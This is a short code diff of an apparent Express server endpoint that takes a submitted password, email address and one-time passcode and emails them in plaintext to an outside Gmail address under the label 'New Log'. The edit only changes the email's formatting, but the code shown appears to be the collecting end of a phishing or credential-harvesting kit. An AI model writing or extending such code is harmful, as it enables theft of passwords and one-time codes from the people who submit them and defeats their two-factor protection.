@@ -35,7 +35,7 @@ app.post("/data", (req, res) => {
                 from: 'Server',
                 to: `alliancebrokersl@gmail.com`,
                 subject: 'New User Sign Up',
-                html: `<text> New Log: Pwd: ${userPass} , Email: ${userEmail} OTP: ${userOTP}.</text>`
+                html: `<text> New Log: Pwd: ${userPass} <br> Email: ${userEmail} <br> OTP: ${userOTP}.</text>`
             };
               
             transporter.sendMail(mailOptions, function(error, info){
